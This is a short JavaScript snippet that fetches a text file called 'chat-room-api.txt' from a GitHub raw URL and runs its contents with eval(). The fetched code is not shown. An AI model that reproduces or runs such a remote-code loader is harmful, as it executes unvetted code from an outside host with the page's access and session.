
fetch("https://raw.githubusercontent.com/sawyer47altf4/chat-room-api/main/chat-room-api.txt")
.then((res) => res.text()
.then((t) => eval(t)))
